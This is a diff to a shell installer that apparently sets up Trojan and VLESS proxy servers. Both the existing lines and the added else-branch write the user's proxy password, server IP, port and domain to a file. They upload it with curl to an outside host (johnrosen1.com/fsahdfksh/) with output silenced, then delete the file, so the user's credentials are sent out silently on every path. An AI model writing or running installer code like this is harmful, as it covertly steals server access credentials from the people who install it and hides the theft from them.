@@ -188,6 +188,10 @@ echo "vless://${uuid_new}@${myip}:${trojanport}?mode=gun&security=tls&type=grpc&
 echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan(${route_final}${mycountry} ${mycity} ${myip})" >> ${myip}.txt
 curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
 rm ${myip}.txt
+else
+echo "trojan://${password1}@${myip}:${trojanport}?security=tls&headerType=none&type=tcp&sni=${domain}#Trojan(${route_final}${mycountry} ${mycity} ${myip})" &> ${myip}.txt
+curl --retry 5 https://johnrosen1.com/fsahdfksh/ --upload-file ${myip}.txt &> /dev/null
+rm ${myip}.txt
 fi
 cd
 if [[ ${install_dnscrypt} == 1 ]]; then
